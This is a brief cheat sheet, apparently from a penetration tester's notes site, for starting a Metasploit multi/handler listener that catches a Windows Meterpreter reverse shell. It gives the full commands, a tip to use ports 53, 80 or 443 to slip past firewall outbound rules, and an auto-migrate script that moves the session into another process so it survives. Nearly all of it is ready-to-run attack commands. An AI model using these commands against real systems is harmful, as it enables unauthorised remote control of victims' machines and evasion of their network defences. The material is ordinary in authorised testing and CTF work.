---
title: "Metasploit Listener"
date: 2024-6-26
tags: ["metasploit", "listener", "revshell"]
---

---
### Start a Metasploit Listener

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.10
set lport 443
run
```

<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

### If the shell die immediately, we can try to migrate it to another process

```bash
# Create a automigrate.rc script
run post/windows/manage/migrate
```

<br>

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.10
set lport 443
set AutoRunScript multi_console_command -r automigrate.rc
run
```

<br>